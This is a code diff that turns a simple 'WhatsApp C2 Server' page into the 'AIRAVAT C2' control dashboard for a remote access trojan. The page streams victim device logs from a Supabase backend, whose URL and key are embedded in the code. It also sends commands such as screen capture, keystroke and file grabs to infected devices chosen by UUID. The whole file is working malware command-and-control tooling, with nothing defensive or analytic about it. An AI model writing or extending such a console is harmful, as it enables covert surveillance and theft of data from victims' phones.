@@ -1,7 +1,71 @@
 <!DOCTYPE html>
-<html><body>
-<h1>WhatsApp C2 Server</h1>
-<a href="cmd.txt">Current Command</a><br>
-<a href="keylogs.txt">Keylogs</a><br>
-<a href="screenshots/">Screenshots</a>
-</body></html>
+<html>
+<head>
+    <title>🦅 AIRAVAT C2 Dashboard</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { border: 1px solid #333; padding: 8px; }
+        .online { background: #004400; }
+        .cmd-input { width: 400px; background: #111; color: #0f0; border: 1px solid #0f0; padding: 5px; }
+        button { background: #0f0; color: #000; border: none; padding: 5px 15px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>🦅 AIRAVAT C2 - Live RAT Control</h1>
+    
+    <div>
+        <input id="uuidInput" class="cmd-input" placeholder="Device UUID (from logs)">
+        <input id="cmdInput" class="cmd-input" placeholder="Enter command (screen, keys, files...)">
+        <button onclick="sendCommand()">📤 SEND COMMAND</button>
+    </div>
+    
+    <h3>📱 Live Device Logs</h3>
+    <table id="logsTable">
+        <thead><tr><th>UUID</th><th>Time</th><th>Status</th><th>Data</th></tr></thead>
+        <tbody></tbody>
+    </table>
+
+    <script>
+        const SUPABASE_URL = 'https://fhqndqxunallfwxvgkkc.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZocW5kcXh1bmFsbGZ3eHZna2tjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE4MjM1ODAsImV4cCI6MjA4NzM5OTU4MH0.na_4Hc9w1Nfm9YRzkbgWdeC44uQTYBRNBdnyW7nps48';
+        
+        const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        
+        // LIVE LOGS
+        supabase.channel('logs').on('postgres_changes', 
+            { event: 'INSERT', schema: 'public', table: 'logs' }, 
+            (payload) => addLog(payload.new)
+        ).subscribe();
+
+        function addLog(log) {
+            const tbody = document.querySelector('#logsTable tbody');
+            const row = tbody.insertRow(0);
+            row.className = 'online';
+            row.innerHTML = `
+                <td>${log.uuid}</td>
+                <td>${new Date(log.created_at).toLocaleString()}</td>
+                <td>${log.status}</td>
+                <td>${log.data}</td>
+            `;
+        }
+
+        async function sendCommand() {
+            const uuid = document.getElementById('uuidInput').value;
+            const cmd = document.getElementById('cmdInput').value;
+            
+            if (!uuid || !cmd) return alert('UUID + CMD required!');
+            
+            await supabase.from('commands').insert({
+                uuid: uuid,
+                command: cmd,
+                status: 'pending'
+            });
+            
+            document.getElementById('cmdInput').value = '';
+            alert(`📤 CMD "${cmd}" sent to ${uuid}`);
+        }
+    </script>
+</body>
+</html>
